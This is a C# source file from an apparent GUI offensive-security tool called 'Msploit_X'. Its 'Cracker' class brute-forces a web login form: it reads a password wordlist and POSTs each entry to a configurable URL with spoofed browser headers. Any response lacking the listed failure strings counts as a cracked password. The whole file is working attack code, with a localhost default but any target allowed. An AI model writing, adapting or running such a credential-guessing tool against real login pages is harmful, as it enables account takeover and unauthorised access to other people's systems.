using System;
using System.IO;
using System.Net;
using System.Net.Cache;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using Avalonia;
using Avalonia.Controls;
using Msploit_X.Views;
using ReactiveUI;

namespace Msploit_X.Models
{
    public class Cracker : ReactiveObject
    {
        private string url = "http://localhost/login.php";
        private string post = "user=user&password=*PASS*";
        private bool running = false;
        private string failedString = "Log in failed|Not logged in|incorrect password";
        private string passwordFile = "Select File";

        private string successPass = "Not yet cracked";

        private string currentPass = "";

        public string Url
        {
            get => url;
            set => this.RaiseAndSetIfChanged(ref url, value);
        }
        
        public string Post
        {
            get => post;
            set => this.RaiseAndSetIfChanged(ref post, value);
        }

        public bool Running
        {
            get => running;
            set => this.RaiseAndSetIfChanged(ref running, value);
        }

        public string FailedString
        {
            get => failedString;
            set => this.RaiseAndSetIfChanged(ref failedString, value);
        }

        public string SuccessPass
        {
            get => successPass;
            set => this.RaiseAndSetIfChanged(ref successPass, value);
        }

        public string PasswordFile
        {
            get => passwordFile;
            set => this.RaiseAndSetIfChanged(ref passwordFile, value);
        }

        public string CurrentPass
        {
            get => currentPass;
            set => this.RaiseAndSetIfChanged(ref currentPass, value);
        }

        public void Start()
        {
            SuccessPass = "Not yet cracked";
            Running = true;
            new Thread(() =>
            {
                StreamReader reader = new StreamReader(PasswordFile);
                while (!reader.EndOfStream && Running)
                {
                    string password = reader.ReadLine();
                    if (password == "") continue;
                    password = HttpUtility.UrlEncode(password);
                    CurrentPass = password;
                    if (check(Url, Post, password, FailedString))
                    {
                        Running = false;
                        SuccessPass = password;
                    }
                }

                Running = false;
            }).Start();
        }

        public bool check(string url, string post, string password, string fail, bool isretry = false)
        {
            try
            {
                post = post.Replace("*PASS*", password);
                byte[] dataStream = Encoding.UTF8.GetBytes(post);
                string responseString = "";
                HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
                request.Timeout = 500;
                request.Method = "POST";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                request.Headers[HttpRequestHeader.AcceptEncoding] = "gzip, deflate, br";
                request.Headers[HttpRequestHeader.AcceptLanguage] = "en-GB,en;q=0.9,en-US;q=0.8";
                request.CachePolicy = new RequestCachePolicy(RequestCacheLevel.Reload);
                request.Host = "localhost";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0";
                request.Headers.Add("Origin", url);
                request.ContentType = "application/x-www-form-urlencoded";
                Stream newStream=request.GetRequestStream();
                
                newStream.Write(dataStream,0,dataStream.Length);
                newStream.Close();
                
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;
                string content;
                using(var reader = new StreamReader(response.GetResponseStream()))
                {
                    content = reader.ReadToEnd();
                }
                response.Close();
                responseString = content;
                bool failed = false;

                foreach (var failure in fail.Split("|"))
                {
                    if (responseString.Contains(failure))
                    {
                        failed = true;
                    }
                }

                return !failed;
            }
            catch (Exception e)
            {
                if (!isretry)
                {
                    check(url, post, password, fail, true);
                }
            }
            return false;
        }

        public void Stop()
        {
            Running = false;
        }

        public void SelectWordList()
        {
            try
            {
                Task<string[]> fileDialog = new OpenFileDialog().ShowAsync(MainWindow.instance);
                fileDialog.Wait();
                PasswordFile = fileDialog.Result[0];
            }
            catch (Exception e)
            {
                
            }
        }
    }
}